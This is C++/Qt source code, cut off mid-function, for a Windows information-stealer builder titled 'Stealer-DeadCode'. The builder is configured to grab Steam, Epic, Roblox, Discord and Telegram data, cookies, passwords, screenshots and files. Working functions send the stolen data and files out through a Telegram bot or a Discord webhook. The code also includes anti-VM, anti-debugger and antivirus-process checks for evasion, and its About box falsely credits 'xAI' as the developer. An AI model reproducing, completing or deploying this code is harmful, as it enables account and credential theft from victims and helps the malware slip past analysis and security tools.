#include <winsock2.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "ui_mainwindow.h" // Используем INCLUDEPATH для поиска в ../release
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Структура конфигурации
struct Config {
    std::string filename;
    std::string telegramToken;
    std::string chatId;
    std::string discordWebhook;
    std::string sendMethod;
    std::string buildMethod;
    std::string encryptionKey1;
    std::string encryptionKey2;
    std::string encryptionSalt;
    bool steam = false;
    bool steamMAFile = false;
    bool epic = false;
    bool roblox = false;
    bool battlenet = false;
    bool minecraft = false;
    bool discord = false;
    bool telegram = false;
    bool chatHistory = false;
    bool cookies = false;
    bool passwords = false;
    bool screenshot = false;
    bool fileGrabber = false;
    bool systemInfo = false;
    bool socialEngineering = false;
    bool antiVM = false;
    bool fakeError = false;
    bool silent = false;
    bool autoStart = false;
    bool persist = false;
};

// Класс главного окна
class MainWindow : public QMainWindow, private Ui::MainWindow {
    Q_OBJECT
public:
    Config config;
    QNetworkAccessManager* networkManager;

    explicit MainWindow(QWidget* parent = nullptr) : QMainWindow(parent), networkManager(new QNetworkAccessManager(this)) {
        setupUi(this);

        // Инициализация UI
        sendMethodComboBox->addItems({"Telegram", "Discord", "Local File"});

        // Подключение сигналов и слотов
        connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::onIconBrowseClicked);
        connect(buildButton, &QPushButton::clicked, this, &MainWindow::onBuildClicked);
        connect(actionSaveConfig, &QAction::triggered, this, &MainWindow::onSaveConfig);
        connect(actionLoadConfig, &QAction::triggered, this, &MainWindow::onLoadConfig);
        connect(actionExportLogs, &QAction::triggered, this, &MainWindow::onExportLogs);
        connect(actionExit, &QAction::triggered, this, &MainWindow::close);
        connect(actionAbout, &QAction::triggered, this, &MainWindow::onAbout);
        connect(this, &MainWindow::sendDataSignal, this, &MainWindow::sendDataSlot);
    }

    ~MainWindow() {
        delete networkManager;
    }

    void appendLog(const std::string& message) {
        std::lock_guard<std::mutex> lock(g_mutex);
        textEdit->append(QString::fromStdString(message));
    }

signals:
    void sendDataSignal(const std::string& data, const std::vector<std::string>& files);

private slots:
    void onIconBrowseClicked() {
        QString fileName = QFileDialog::getOpenFileName(this, tr("Выберите иконку"), "", tr("Icon Files (*.ico)"));
        if (!fileName.isEmpty()) {
            iconPathLineEdit->setText(fileName);
            appendLog("Выбрана иконка: " + fileName.toStdString());
        }
    }

    void onBuildClicked() {
        // Получение настроек из интерфейса
        config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
        config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
        config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
        config.telegramToken = tokenLineEdit->text().toStdString();
        config.chatId = chatIdLineEdit->text().toStdString();
        config.discordWebhook = discordWebhookLineEdit->text().toStdString();
        config.sendMethod = sendMethodComboBox->currentText().toStdString();
        config.steam = steamCheckBox->isChecked();
        config.steamMAFile = steamMAFileCheckBox->isChecked();
        config.epic = epicCheckBox->isChecked();
        config.roblox = robloxCheckBox->isChecked();
        config.battlenet = battlenetCheckBox->isChecked();
        config.minecraft = minecraftCheckBox->isChecked();
        config.discord = discordCheckBox->isChecked();
        config.telegram = telegramCheckBox->isChecked();
        config.chatHistory = chatHistoryCheckBox->isChecked();
        config.cookies = cookiesCheckBox->isChecked();
        config.passwords = passwordsCheckBox->isChecked();
        config.screenshot = screenshotCheckBox->isChecked();
        config.fileGrabber = fileGrabberCheckBox->isChecked();
        config.systemInfo = systemInfoCheckBox->isChecked();
        config.socialEngineering = socialEngineeringCheckBox->isChecked();
        config.antiVM = antiVMCheckBox->isChecked();
        config.fakeError = fakeErrorCheckBox->isChecked();
        config.silent = silentCheckBox->isChecked();
        config.autoStart = autoStartCheckBox->isChecked();
        config.persist = persistCheckBox->isChecked();

        // Проверка обязательных полей
        if (config.encryptionKey1.empty() || config.encryptionKey2.empty() || config.encryptionSalt.empty()) {
            appendLog("Ошибка: ключи шифрования и соль должны быть заполнены");
            return;
        }
        if (config.sendMethod == "Telegram" && (config.telegramToken.empty() || config.chatId.empty())) {
            appendLog("Ошибка: для Telegram необходимо указать токен и Chat ID");
            return;
        }
        if (config.sendMethod == "Discord" && config.discordWebhook.empty()) {
            appendLog("Ошибка: для Discord необходимо указать вебхук");
            return;
        }

        appendLog("Сборка начата...");

        // Запуск сбора данных в отдельном потоке
        std::thread dataCollector([this]() {
            CollectData();
        });
        dataCollector.detach();
    }

    void onSaveConfig() {
        QString fileName = QFileDialog::getSaveFileName(this, tr("Сохранить конфигурацию"), "", tr("Config Files (*.ini)"));
        if (fileName.isEmpty()) return;

        QSettings settings(fileName, QSettings::IniFormat);
        settings.setValue("Token", tokenLineEdit->text());
        settings.setValue("ChatID", chatIdLineEdit->text());
        settings.setValue("DiscordWebhook", discordWebhookLineEdit->text());
        settings.setValue("FileName", fileNameLineEdit->text());
        settings.setValue("EncryptionKey1", encryptionKey1LineEdit->text());
        settings.setValue("EncryptionKey2", encryptionKey2LineEdit->text());
        settings.setValue("EncryptionSalt", encryptionSaltLineEdit->text());
        settings.setValue("IconPath", iconPathLineEdit->text());
        settings.setValue("SendMethod", sendMethodComboBox->currentText());
        settings.setValue("Steam", steamCheckBox->isChecked());
        settings.setValue("SteamMAFile", steamMAFileCheckBox->isChecked());
        settings.setValue("Epic", epicCheckBox->isChecked());
        settings.setValue("Roblox", robloxCheckBox->isChecked());
        settings.setValue("BattleNet", battlenetCheckBox->isChecked());
        settings.setValue("Minecraft", minecraftCheckBox->isChecked());
        settings.setValue("Discord", discordCheckBox->isChecked());
        settings.setValue("Telegram", telegramCheckBox->isChecked());
        settings.setValue("ChatHistory", chatHistoryCheckBox->isChecked());
        settings.setValue("Cookies", cookiesCheckBox->isChecked());
        settings.setValue("Passwords", passwordsCheckBox->isChecked());
        settings.setValue("Screenshot", screenshotCheckBox->isChecked());
        settings.setValue("FileGrabber", fileGrabberCheckBox->isChecked());
        settings.setValue("SystemInfo", systemInfoCheckBox->isChecked());
        settings.setValue("SocialEngineering", socialEngineeringCheckBox->isChecked());
        settings.setValue("AntiVM", antiVMCheckBox->isChecked());
        settings.setValue("FakeError", fakeErrorCheckBox->isChecked());
        settings.setValue("Silent", silentCheckBox->isChecked());
        settings.setValue("AutoStart", autoStartCheckBox->isChecked());
        settings.setValue("Persist", persistCheckBox->isChecked());

        appendLog("Конфигурация сохранена в: " + fileName.toStdString());
    }

    void onLoadConfig() {
        QString fileName = QFileDialog::getOpenFileName(this, tr("Загрузить конфигурацию"), "", tr("Config Files (*.ini)"));
        if (fileName.isEmpty()) return;

        QSettings settings(fileName, QSettings::IniFormat);
        tokenLineEdit->setText(settings.value("Token", "").toString());
        chatIdLineEdit->setText(settings.value("ChatID", "").toString());
        discordWebhookLineEdit->setText(settings.value("DiscordWebhook", "").toString());
        fileNameLineEdit->setText(settings.value("FileName", "DeadCode.exe").toString());
        encryptionKey1LineEdit->setText(settings.value("EncryptionKey1", "").toString());
        encryptionKey2LineEdit->setText(settings.value("EncryptionKey2", "").toString());
        encryptionSaltLineEdit->setText(settings.value("EncryptionSalt", "").toString());
        iconPathLineEdit->setText(settings.value("IconPath", "").toString());
        sendMethodComboBox->setCurrentText(settings.value("SendMethod", "Local File").toString());
        steamCheckBox->setChecked(settings.value("Steam", false).toBool());
        steamMAFileCheckBox->setChecked(settings.value("SteamMAFile", false).toBool());
        epicCheckBox->setChecked(settings.value("Epic", false).toBool());
        robloxCheckBox->setChecked(settings.value("Roblox", false).toBool());
        battlenetCheckBox->setChecked(settings.value("BattleNet", false).toBool());
        minecraftCheckBox->setChecked(settings.value("Minecraft", false).toBool());
        discordCheckBox->setChecked(settings.value("Discord", false).toBool());
        telegramCheckBox->setChecked(settings.value("Telegram", false).toBool());
        chatHistoryCheckBox->setChecked(settings.value("ChatHistory", false).toBool());
        cookiesCheckBox->setChecked(settings.value("Cookies", false).toBool());
        passwordsCheckBox->setChecked(settings.value("Passwords", false).toBool());
        screenshotCheckBox->setChecked(settings.value("Screenshot", false).toBool());
        fileGrabberCheckBox->setChecked(settings.value("FileGrabber", false).toBool());
        systemInfoCheckBox->setChecked(settings.value("SystemInfo", false).toBool());
        socialEngineeringCheckBox->setChecked(settings.value("SocialEngineering", false).toBool());
        antiVMCheckBox->setChecked(settings.value("AntiVM", false).toBool());
        fakeErrorCheckBox->setChecked(settings.value("FakeError", false).toBool());
        silentCheckBox->setChecked(settings.value("Silent", false).toBool());
        autoStartCheckBox->setChecked(settings.value("AutoStart", false).toBool());
        persistCheckBox->setChecked(settings.value("Persist", false).toBool());

        appendLog("Конфигурация загружена из: " + fileName.toStdString());
    }

    void onExportLogs() {
        QString fileName = QFileDialog::getSaveFileName(this, tr("Экспорт логов"), "", tr("Text Files (*.txt)"));
        if (fileName.isEmpty()) return;

        QFile file(fileName);
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            out << textEdit->toPlainText();
            file.close();
            appendLog("Логи экспортированы в: " + fileName.toStdString());
        } else {
            appendLog("Ошибка: не удалось экспортировать логи");
        }
    }

    void onAbout() {
        QMessageBox::about(this, tr("О программе"), tr("Stealer-DeadCode\nВерсия: 1.0\nРазработчик: xAI\nОписание: Многофункциональный инструмент для сбора данных.\nДата: 20 марта 2025"));
    }

    void sendDataSlot(const std::string& data, const std::vector<std::string>& files) {
        bool sent = false;
        if (config.sendMethod == "Telegram") {
            sent = SendViaTelegram(data, files);
        } else if (config.sendMethod == "Discord") {
            sent = SendViaDiscord(data, files);
        } else if (config.sendMethod == "Local File") {
            sent = SaveToLocalFile(data, files);
        }

        if (sent) {
            appendLog("Data sent successfully via " + config.sendMethod);
        } else {
            appendLog("Failed to send data via " + config.sendMethod);
        }

        // Очистка
        for (const auto& file : files) {
            std::filesystem::remove(file);
        }
    }

private:
    bool SendViaTelegram(const std::string& data, const std::vector<std::string>& files) {
        if (config.sendMethod != "Telegram") return false;

        QNetworkRequest request;
        QHttpMultiPart multiPart(QHttpMultiPart::FormDataType);

        std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendMessage";
        request.setUrl(QUrl(QString::fromStdString(url)));
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
        textPart.setBody(QString::fromStdString(config.chatId).toUtf8());
        QHttpPart textPart2;
        textPart2.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"text\""));
        textPart2.setBody(QString::fromStdString(data).toUtf8());
        multiPart.append(textPart);
        multiPart.append(textPart2);

        QNetworkReply* reply = networkManager->post(request, &multiPart);
        QEventLoop loop;
        QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
        loop.exec();
        bool success = reply->error() == QNetworkReply::NoError;
        if (!success) {
            appendLog("Failed to send message via Telegram: " + reply->errorString().toStdString());
        } else {
            appendLog("Sent message via Telegram");
        }
        reply->deleteLater();

        for (const auto& file : files) {
            url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
            request.setUrl(QUrl(QString::fromStdString(url)));
            QHttpMultiPart fileMultiPart(QHttpMultiPart::FormDataType);
            QHttpPart chatIdPart;
            chatIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
            chatIdPart.setBody(QString::fromStdString(config.chatId).toUtf8());
            fileMultiPart.append(chatIdPart);

            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(file) + "\""));
            QFile* fileToSend = new QFile(QString::fromStdString(file));
            if (!fileToSend->open(QIODevice::ReadOnly)) {
                appendLog("Failed to open file for Telegram: " + file);
                delete fileToSend;
                continue;
            }
            filePart.setBodyDevice(fileToSend);
            fileToSend->setParent(&fileMultiPart);
            fileMultiPart.append(filePart);

            reply = networkManager->post(request, &fileMultiPart);
            QEventLoop fileLoop;
            QObject::connect(reply, &QNetworkReply::finished, &fileLoop, &QEventLoop::quit);
            fileLoop.exec();
            success = reply->error() == QNetworkReply::NoError;
            if (!success) {
                appendLog("Failed to send file via Telegram: " + file + " - " + reply->errorString().toStdString());
            } else {
                appendLog("Sent file via Telegram: " + file);
            }
            reply->deleteLater();
        }

        return success;
    }

    bool SendViaDiscord(const std::string& data, const std::vector<std::string>& files) {
        if (config.sendMethod != "Discord") return false;

        QNetworkRequest request;
        request.setUrl(QUrl(QString::fromStdString(config.discordWebhook)));
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");

        QJsonObject json;
        json["content"] = QString::fromStdString(data);
        QJsonDocument doc(json);
        QByteArray dataBytes = doc.toJson();

        QNetworkReply* reply = networkManager->post(request, dataBytes);
        QEventLoop loop;
        QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
        loop.exec();
        bool success = reply->error() == QNetworkReply::NoError;
        if (!success) {
            appendLog("Failed to send message via Discord: " + reply->errorString().toStdString());
        } else {
            appendLog("Sent message via Discord");
        }
        reply->deleteLater();

        for (const auto& file : files) {
            QHttpMultiPart multiPart(QHttpMultiPart::FormDataType);
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(file) + "\""));
            QFile* fileToSend = new QFile(QString::fromStdString(file));
            if (!fileToSend->open(QIODevice::ReadOnly)) {
                appendLog("Failed to open file for Discord: " + file);
                delete fileToSend;
                continue;
            }
            filePart.setBodyDevice(fileToSend);
            fileToSend->setParent(&multiPart);
            multiPart.append(filePart);

            request.setUrl(QUrl(QString::fromStdString(config.discordWebhook)));
            reply = networkManager->post(request, &multiPart);
            QEventLoop fileLoop;
            QObject::connect(reply, &QNetworkReply::finished, &fileLoop, &QEventLoop::quit);
            fileLoop.exec();
            success = reply->error() == QNetworkReply::NoError;
            if (!success) {
                appendLog("Failed to send file via Discord: " + file + " - " + reply->errorString().toStdString());
            } else {
                appendLog("Sent file via Discord: " + file);
            }
            reply->deleteLater();
        }

        return success;
    }

    bool SaveToLocalFile(const std::string& data, const std::vector<std::string>& files) {
        if (config.sendMethod != "Local File") return false;

        std::string fileName = "output_" + std::to_string(GetTickCount()) + ".txt";
        std::ofstream outFile(fileName);
        if (!outFile.is_open()) {
            appendLog("Failed to create local file: " + fileName);
            return false;
        }

        outFile << data;
        outFile << "\nAttached Files:\n";
        for (const auto& file : files) {
            outFile << file << "\n";
        }
        outFile.close();

        appendLog("Data saved to local file: " + fileName);
        return true;
    }
};

// Реализация шифрования данных
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        throw std::runtime_error("Encryption parameters cannot be empty");
    }

    // Получаем ключи и IV из build_key.h
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32); // Для AES-256 нужно 32 байта
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        throw std::runtime_error("Failed to open AES algorithm provider: " + std::to_string(status));
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to set chaining mode: " + std::to_string(status));
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to generate symmetric key: " + std::to_string(status));
    }

    // Подготавливаем данные для шифрования
    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to calculate encrypted data size: " + std::to_string(status));
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to encrypt data: " + std::to_string(status));
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // Преобразуем зашифрованные данные в строку (base64 для удобства)
    DWORD base64Size = 0;
    CryptBinaryToStringA(encryptedData.data(), cbResult, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size);
    std::vector<char> base64Data(base64Size);
    CryptBinaryToStringA(encryptedData.data(), cbResult, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size);

    return std::string(base64Data.data(), base64Size - 1); // Убираем завершающий \0
}

// Реализация дешифрования данных
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty()) {
        return "";
    }

    if (!g_mainWindow) {
        return "";
    }

    std::string key1 = g_mainWindow->config.encryptionKey1;
    std::string key2 = g_mainWindow->config.encryptionKey2;
    std::string salt = g_mainWindow->config.encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Decryption keys or salt are empty");
        return "";
    }

    // Получаем ключи и IV
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    // Декодируем base64
    DWORD binarySize = 0;
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr);
    std::vector<BYTE> binaryData(binarySize);
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to open AES algorithm provider for decryption: " + std::to_string(status));
        return "";
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to set chaining mode for decryption: " + std::to_string(status));
        return "";
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to generate symmetric key for decryption: " + std::to_string(status));
        return "";
    }

    // Дешифруем данные
    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, binaryData.data(), binarySize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to calculate decrypted data size: " + std::to_string(status));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, binaryData.data(), binarySize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to decrypt data: " + std::to_string(status));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string((char*)decryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool CheckVirtualEnvironment() {
    bool isVM = false;

    // Проверка реестра на наличие идентификаторов виртуальных машин
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("VM detected via SCSI identifier: " + identifier);
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка наличия модулей песочницы или отладчика
    if (GetModuleHandleA("SbieDll.dll")) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Sandboxie detected (SbieDll.dll)");
        isVM = true;
    }
    if (GetModuleHandleA("dbghelp.dll")) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Debugger detected (dbghelp.dll)");
        isVM = true;
    }

    // Проверка системной информации
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB");
        isVM = true;
    }

    // Проверка времени выполнения
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Suspicious execution time detected: " + std::to_string(elapsed) + " ms");
        isVM = true;
    }

    // Проверка MAC-адреса
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            if (mac.find("00-50-56") != std::string::npos || // VMware
                mac.find("00-0C-29") != std::string::npos || // VMware
                mac.find("00-1C-14") != std::string::npos || // VMware
                mac.find("00-05-69") != std::string::npos || // VMware
                mac.find("08-00-27") != std::string::npos) { // VirtualBox
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("VM MAC address detected: " + mac);
                isVM = true;
            }
        }
    }

    // Проверка специфических драйверов
    const char* vmDrivers[] = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", nullptr};
    for (int i = 0; vmDrivers[i]; i++) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + std::string(vmDrivers[i]);
        if (std::filesystem::exists(driverPath)) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("VM driver detected: " + std::string(vmDrivers[i]));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Debugger detected via IsDebuggerPresent");
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
    if (NtQueryInformationThread) {
        THREAD_BASIC_INFORMATION tbi;
        NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
        if (tbi.TebBaseAddress) {
            DWORD debugPort = 0;
            NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
            if (debugPort != 0) {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Debugger detected via NtQueryInformationThread");
                return true;
            }
        }
    }

    const char* avProcesses[] = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe", nullptr
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for AV check");
        return false;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            for (int i = 0; avProcesses[i]; i++) {
                std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Antivirus process detected: " + std::string(avProcesses[i]));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ
bool AntiAnalysis() {
    if (!g_mainWindow) return false;

    if (g_mainWindow->config.antiVM && CheckVirtualEnvironment()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Virtual machine detected, exiting");
        return true;
    }

